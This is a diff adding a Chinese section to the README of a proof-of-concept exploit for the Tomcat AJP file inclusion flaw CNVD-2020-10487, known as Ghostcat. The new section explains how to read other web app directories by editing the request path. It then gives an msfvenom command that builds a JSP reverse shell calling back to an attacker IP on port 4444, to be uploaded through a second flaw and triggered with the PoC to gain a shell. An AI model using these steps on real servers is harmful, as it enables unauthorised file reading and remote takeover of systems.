@@ -59,6 +59,19 @@ python CNVD-2020-10487-Tomcat-Ajp-lfi.py target.com
 > 
 > python CNVD-2020-10487-Tomcat-Ajp-lfi.py -f /index.jsp 192.168.125.128
 
+## 跨目录和反弹shell
+默认读取webapps下的ROOT，修改“/asdf”为“/test/asdf”可以访问webapps下test目录的内容
+<pre>
+t.perform_request('/asdf',attributes=[
+</pre>
+
+若服务器同时存在文件上传漏洞，上传下面的shell.txt
+<pre>
+msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.125.130 LPORT=4444 > shell.txt
+</pre>  
+修改“/asdf”为“/asdf.jsp”，启动MSF后使用PoC工具可以取得shell
+
+
 # 其他相关工具
 https://github.com/0nise/CVE-2020-1938  
 https://github.com/hypn0s/AJPy  
